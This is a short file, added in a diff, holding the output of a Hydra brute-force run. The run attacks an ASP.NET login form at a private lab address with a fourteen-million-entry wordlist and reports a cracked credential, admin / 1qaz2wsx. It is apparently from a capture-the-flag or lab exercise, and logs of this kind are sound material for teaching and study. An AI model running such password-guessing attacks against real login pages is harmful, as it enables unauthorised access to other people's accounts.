@@ -1,0 +1,8 @@
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-20 07:10:09
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344401 login tries (l:1/p:14344401), ~896526 tries per task
+[DATA] attacking http-post-form://10.10.14.14:80/Account/login.aspx:__VIEWSTATE=YYkpTrjVFTE%2BiGA1v3KG0ooCxx0Ji1uiifZK%2FdfdJ3U8%2FdznYKpPXxjxFU%2BOOjwlSR7Tzuq7VdrBSds2xh20Vb9UQpMBSttjsLdFEMkk1jBtDZ%2FdLpN1fBkpTZa11S5dLmeALO%2BcHLwb3fecWxcsDohKXr4zF4b37rcL5RYTFVuinbqL&__EVENTVALIDATION=Ttl6Ph2EbRC%2F%2FDP22elLMaTLkZXRFRHrvp2UvYW%2FEVtViL7ySjN%2FBiuVGvG%2FZ0m%2BlQWaLr%2FdbLvDUmv98wOLit1n7NTkL%2FUL%2B9cnnewriRtSxQoC52IYcIW5i0GEKTynozKfEtA4truhd0eLtiVVSA2L5wG%2F%2BNrXjQXfbVN7absOeEBP&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
+[80][http-post-form] host: 10.10.14.14   login: admin   password: 1qaz2wsx
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-20 07:10:31
